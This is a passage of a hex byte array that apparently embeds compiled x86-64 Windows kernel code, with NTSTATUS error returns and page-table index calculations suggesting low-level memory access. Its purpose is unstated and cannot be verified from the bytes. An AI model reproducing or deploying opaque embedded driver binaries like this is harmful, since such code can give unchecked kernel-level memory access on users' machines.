	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0xE8, 0xF1, 0xFF, 0xFF,
	0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x74,
	0x09, 0xC6, 0x05, 0x75, 0x84, 0x00, 0x00, 0x01, 0xEB, 0x07, 0xC6, 0x05,
	0x6C, 0x84, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xD4, 0x33, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x05, 0xE8, 0x33, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B,
	0x54, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0xAF, 0xEF, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x83, 0x7C, 0x24, 0x40, 0x00,
	0x74, 0x07, 0xC6, 0x05, 0x2C, 0x84, 0x00, 0x00, 0x01, 0xC6, 0x05, 0x26,
	0x84, 0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0x1E, 0x84, 0x00, 0x00, 0xEB,
	0x17, 0xC6, 0x05, 0x15, 0x84, 0x00, 0x00, 0x00, 0xC6, 0x05, 0x0F, 0x84,
	0x00, 0x00, 0x01, 0x0F, 0xB6, 0x05, 0x07, 0x84, 0x00, 0x00, 0xEB, 0x00,
	0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xE8, 0x47, 0x1B, 0x00, 0x00, 0xE8, 0xF2, 0x1C, 0x00, 0x00, 0xE8, 0x1D,
	0x16, 0x00, 0x00, 0xE8, 0x08, 0x15, 0x00, 0x00, 0xE8, 0x53, 0x14, 0x00,
	0x00, 0xE8, 0xDE, 0x11, 0x00, 0x00, 0xE8, 0x89, 0x20, 0x00, 0x00, 0xE8,
	0xD4, 0x19, 0x00, 0x00, 0xE8, 0x6F, 0x1C, 0x00, 0x00, 0xE8, 0xEA, 0x12,
	0x00, 0x00, 0xE8, 0x65, 0x16, 0x00, 0x00, 0xE8, 0xA0, 0x14, 0x00, 0x00,
	0xE8, 0x5B, 0x13, 0x00, 0x00, 0xE8, 0xA6, 0x17, 0x00, 0x00, 0xE8, 0x21,
	0x15, 0x00, 0x00, 0xE8, 0xCC, 0x18, 0x00, 0x00, 0xE8, 0x47, 0x1F, 0x00,
	0x00, 0xE8, 0x12, 0x1D, 0x00, 0x00, 0xE8, 0x6D, 0x1B, 0x00, 0x00, 0xE8,
	0xE8, 0x1D, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83,
	0xEC, 0x48, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48,
	0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
	0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x30, 0x48, 0x89,
	0x44, 0x24, 0x20, 0x41, 0xB9, 0x2C, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0,
	0x48, 0x8D, 0x15, 0xAD, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xC6, 0x33,
	0x00, 0x00, 0xE8, 0xD1, 0xD3, 0xFF, 0xFF, 0x85, 0xC0, 0x7C, 0x13, 0x48,
	0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xC0, 0x1C, 0x48, 0x89, 0x44, 0x24,
	0x30, 0xE9, 0x8D, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24,
	0x20, 0x41, 0xB9, 0x1D, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x48, 0x8D,
	0x15, 0x97, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x80, 0x33, 0x00, 0x00,
	0xE8, 0x8B, 0xD3, 0xFF, 0xFF, 0x85, 0xC0, 0x7C, 0x10, 0x48, 0x8B, 0x44,
	0x24, 0x30, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB,
	0x4A, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,
	0x44, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB9, 0x1B, 0x00,
	0x00, 0x00, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x15, 0x74, 0x61, 0x00, 0x00,
	0x48, 0x8D, 0x0D, 0x3D, 0x33, 0x00, 0x00, 0xE8, 0x48, 0xD3, 0xFF, 0xFF,
	0x85, 0xC0, 0x7C, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xC0,
	0x10, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x07, 0x32, 0xC0, 0xE9, 0xC6,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8D, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB9,
	0x06, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x15, 0x46, 0x61,
	0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF3, 0x32, 0x00, 0x00, 0xE8, 0xFE, 0xD2,
	0xFF, 0xFF, 0x85, 0xC0, 0x7C, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48,
	0x83, 0xC0, 0x03, 0x48, 0x89, 0x44, 0x24, 0x38, 0xEB, 0x47, 0x48, 0xC7,
	0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x38,
	0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB9, 0x0F, 0x00, 0x00, 0x00, 0x45,
	0x33, 0xC0, 0x48, 0x8D, 0x15, 0x0F, 0x61, 0x00, 0x00, 0x48, 0x8D, 0x0D,
	0xB0, 0x32, 0x00, 0x00, 0xE8, 0xBB, 0xD2, 0xFF, 0xFF, 0x85, 0xC0, 0x7C,
	0x10, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC0, 0x03, 0x48, 0x89,
	0x44, 0x24, 0x38, 0xEB, 0x04, 0x32, 0xC0, 0xEB, 0x3C, 0x41, 0xB8, 0x07,
	0x00, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x30, 0xE8, 0x7E, 0x06, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48,
	0x89, 0x01, 0x41, 0xB8, 0x07, 0x00, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0xE8, 0x61, 0x06, 0x00, 0x00, 0x48,
	0x8B, 0x4C, 0x24, 0x58, 0x48, 0x89, 0x01, 0xB0, 0x01, 0x48, 0x83, 0xC4,
	0x48, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC,
	0x28, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x30, 0x01, 0x00, 0x00,
	0x00, 0x74, 0x0D, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x83,
	0x38, 0x00, 0x75, 0x0A, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0xA5, 0x03,
	0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xE8,
	0xB4, 0xCD, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x84,
	0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x63, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x60, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
	0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0x44,
	0x24, 0x68, 0xFF, 0x15, 0x48, 0x50, 0x00, 0x00, 0x89, 0x44, 0x24, 0x28,
	0x83, 0x7C, 0x24, 0x28, 0x00, 0x7C, 0x08, 0x48, 0x83, 0x7C, 0x24, 0x20,
	0x00, 0x75, 0x47, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x74, 0x35, 0xE8,
	0xE0, 0xCB, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x44,
	0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8B, 0x44, 0x24, 0x70,
	0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x78, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF9,
	0x4F, 0x00, 0x00, 0x90, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xE9, 0x09, 0x03,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x7C, 0x24, 0x38,
	0x00, 0x74, 0x0B, 0x48, 0x81, 0x7C, 0x24, 0x38, 0x00, 0x10, 0x00, 0x00,
	0x76, 0x4A, 0xE8, 0x7D, 0xCB, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x84, 0x24,
	0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24,
	0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0x8A, 0x4F, 0x00, 0x00, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9,
	0x9B, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x50, 0x08, 0x48, 0x8B, 0x0D, 0x05, 0x60, 0x00, 0x00, 0xE8,
	0x00, 0x06, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x83, 0x7C,
	0x24, 0x30, 0x00, 0x0F, 0x85, 0x74, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x05,
	0xFC, 0x5F, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x1B, 0x01, 0x00, 0x00,
	0xE8, 0x4B, 0xCF, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x84, 0x24, 0xA8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xA8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xFF, 0x15,
	0x08, 0x4F, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x98, 0xE7, 0xFF, 0xFF,
	0x48, 0x89, 0x05, 0x91, 0x5F, 0x00, 0x00, 0xC6, 0x05, 0x9E, 0x5F, 0x00,
	0x00, 0x00, 0x48, 0x83, 0x3D, 0x82, 0x5F, 0x00, 0x00, 0x00, 0x75, 0x4A,
	0xE8, 0x9B, 0xCA, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x84, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0xFF, 0x15,
	0xA8, 0x4E, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xE9, 0xB9, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x50, 0x08, 0x48, 0x8B, 0x0D, 0x23, 0x5F, 0x00, 0x00, 0xE8, 0x1E, 0x05,
	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x83, 0x7C, 0x24, 0x30,
	0x00, 0x75, 0x4A, 0xE8, 0x2C, 0xCA, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24,
	0xD0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x84,
	0x24, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xD0, 0x00, 0x00,
	0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C,
	0x24, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE0, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0x39, 0x4E, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0,
	0xE9, 0x4A, 0x01, 0x00, 0x00, 0xEB, 0x4A, 0xE8, 0xE0, 0xC9, 0xFF, 0xFF,
	0x48, 0x89, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
	0x20, 0x48, 0x89, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xF8, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x8C, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0xF8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xED, 0x4D, 0x00, 0x00, 0xB8,
	0x01, 0x00, 0x00, 0xC0, 0xE9, 0xFE, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44,
	0x24, 0x30, 0x48, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00,
	0x00, 0x48, 0x2B, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x3B, 0x44, 0x24, 0x38,
	0x73, 0x1D, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x25, 0xFF, 0x0F, 0x00,
	0x00, 0xB9, 0x00, 0x10, 0x00, 0x00, 0x48, 0x2B, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x89, 0x44, 0x24, 0x40, 0xEB, 0x0A, 0x48, 0x8B, 0x44, 0x24, 0x38,
	0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x89,
	0x44, 0x24, 0x50, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x40, 0x20,
	0x85, 0xC0, 0x74, 0x26, 0x4C, 0x8D, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0x44,
	0x24, 0x50, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x50, 0x10, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0xD4, 0x07, 0x00, 0x00,
	0x89, 0x44, 0x24, 0x28, 0xEB, 0x24, 0x4C, 0x8D, 0x4C, 0x24, 0x48, 0x4C,
	0x8B, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x50, 0x10, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x5E, 0x02,
	0x00, 0x00, 0x89, 0x44, 0x24, 0x28, 0xE8, 0xE5, 0xC8, 0xFF, 0xFF, 0x48,
	0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x48, 0x89, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24,
	0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24,
	0x10, 0x01, 0x00, 0x00, 0xFF, 0x15, 0xF2, 0x4C, 0x00, 0x00, 0x8B, 0x44,
	0x24, 0x28, 0xEB, 0x07, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x00, 0x48,
	0x81, 0xC4, 0x28, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x66, 0x44, 0x89, 0x4C, 0x24, 0x20, 0x44, 0x89, 0x44, 0x24, 0x18, 0x89,
	0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC,
	0x70, 0x48, 0x8B, 0x05, 0xC0, 0x5C, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48,
	0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x83, 0x78, 0x08, 0x00, 0x74, 0x0E, 0x48, 0x8B, 0x84, 0x24, 0x80,
	0x00, 0x00, 0x00, 0x48, 0x83, 0x38, 0x00, 0x75, 0x0E, 0x48, 0x8B, 0x8C,
	0x24, 0x80, 0x00, 0x00, 0x00, 0xE8, 0x5E, 0xF4, 0xFF, 0xFF, 0x90, 0x48,
	0x8D, 0x44, 0x24, 0x48, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x18, 0x00,
	0x00, 0x00, 0xF3, 0xAA, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x54, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x58, 0x0F, 0xB7, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x44, 0x24, 0x4C, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x5C, 0xB1, 0x02, 0xFF, 0x15, 0xDE, 0x4B, 0x00, 0x00, 0x88, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x60,
	0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x4C, 0x24, 0x40, 0x4C, 0x8D,
	0x4C, 0x24, 0x34, 0x4C, 0x8B, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x48,
	0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x08, 0x48, 0x8B,
	0x44, 0x24, 0x40, 0xFF, 0x15, 0xF7, 0x4B, 0x00, 0x00, 0x0F, 0xB6, 0x4C,
	0x24, 0x30, 0xFF, 0x15, 0x84, 0x4B, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x4C,
	0x24, 0x68, 0x48, 0x33, 0xCC, 0xE8, 0xD6, 0x25, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x70, 0x5F, 0xC3, 0x89, 0x54, 0x24, 0x10, 0x89, 0x4C, 0x24, 0x08,
	0x48, 0x83, 0xEC, 0x68, 0xE8, 0xEF, 0xC9, 0xFF, 0xFF, 0x48, 0x89, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x38,
	0x33, 0xC9, 0x48, 0x8B, 0x44, 0x24, 0x38, 0xFF, 0x15, 0xAB, 0x4B, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x8B, 0x44, 0x24, 0x40, 0x89, 0x44,
	0x24, 0x20, 0xE8, 0xB1, 0xC7, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8D,
	0x4C, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x50, 0xFF, 0x15, 0x7A, 0x4B,
	0x00, 0x00, 0x89, 0x44, 0x24, 0x24, 0x8B, 0x44, 0x24, 0x70, 0x8B, 0x4C,
	0x24, 0x78, 0x2B, 0xC8, 0x8B, 0xC1, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x28,
	0x33, 0xD2, 0x8B, 0x44, 0x24, 0x24, 0x8B, 0x4C, 0x24, 0x28, 0xF7, 0xF1,
	0x8B, 0xC2, 0x03, 0x44, 0x24, 0x70, 0x48, 0x83, 0xC4, 0x68, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54,
	0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48,
	0x8B, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x39, 0x08,
	0x75, 0x0B, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x40, 0x08, 0xEB,
	0x37, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC0, 0x08, 0x4C, 0x8B,
	0x4C, 0x24, 0x40, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD0,
	0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x22, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x08, 0x48,
	0x8B, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x83, 0xC4, 0x28,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x89, 0x4C, 0x24,
	0x20, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48,
	0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x8B, 0x44, 0x24,
	0x60, 0x48, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x69, 0xC9, 0xFF, 0xFF, 0x48,
	0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x89, 0x44,
	0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8B, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB9,
	0x01, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x54,
	0x24, 0x40, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x48,
	0xFF, 0x15, 0x6E, 0x4A, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC,
	0x44, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x89, 0x44, 0x24, 0x08, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24,
	0x08, 0x8B, 0x04, 0x01, 0x89, 0x04, 0x24, 0x8B, 0x44, 0x24, 0x40, 0x48,
	0x8B, 0x4C, 0x24, 0x08, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x63,
	0x0C, 0x24, 0x48, 0x03, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B,
	0x44, 0x24, 0x10, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x89, 0x54, 0x24,
	0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x83,
	0x7C, 0x24, 0x40, 0x00, 0x75, 0x05, 0xE9, 0x82, 0x00, 0x00, 0x00, 0x48,
	0x83, 0x7C, 0x24, 0x48, 0x00, 0x74, 0x58, 0x48, 0x8B, 0x4C, 0x24, 0x48,
	0xE8, 0xB9, 0x21, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x81,
	0x7C, 0x24, 0x20, 0xFF, 0x7F, 0x00, 0x00, 0x76, 0x09, 0x48, 0xC7, 0x44,
	0x24, 0x20, 0xFF, 0x7F, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0xD1, 0xE0, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x66, 0x89, 0x01, 0x48, 0x8B,
	0x44, 0x24, 0x40, 0x0F, 0xB7, 0x00, 0x48, 0x83, 0xC0, 0x02, 0x48, 0x8B,
	0x4C, 0x24, 0x40, 0x66, 0x89, 0x41, 0x02, 0x48, 0x8B, 0x44, 0x24, 0x40,
	0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x89, 0x48, 0x08, 0xEB, 0x22, 0x33,
	0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x66, 0x89, 0x01, 0x33, 0xC0, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x66, 0x89, 0x41, 0x02, 0x48, 0x8B, 0x44, 0x24,
	0x40, 0x48, 0xC7, 0x40, 0x08, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
	0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83, 0xE0, 0xF0, 0x48, 0x89, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00,
	0x00, 0x48, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70,
	0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x0C,
	0x48, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
	0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x15, 0x48,
	0x25, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B,
	0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x1E, 0x48, 0x25,
	0xFF, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x84,
	0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x27, 0x48, 0x25, 0xFF,
	0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x90, 0x00, 0x00,
	0x00, 0x00, 0x74, 0x0B, 0x48, 0x83, 0xBC, 0x24, 0x90, 0x00, 0x00, 0x00,
	0xFF, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x15, 0x02, 0x00, 0x00, 0x48, 0x6B,
	0x44, 0x24, 0x40, 0x10, 0x48, 0x8D, 0x0D, 0xA9, 0x59, 0x00, 0x00, 0x48,
